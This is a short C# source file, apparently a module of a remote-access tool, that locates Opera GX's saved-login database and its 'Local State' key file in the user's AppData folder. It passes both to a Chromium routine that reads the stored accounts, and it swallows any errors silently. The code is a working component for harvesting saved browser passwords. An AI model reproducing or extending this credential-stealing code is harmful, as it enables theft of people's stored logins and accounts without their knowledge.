using Q3C273.Shared.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Ton618.Recovery.Browsers
{
    public class OperaGXPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera GX";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Login Data");
                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
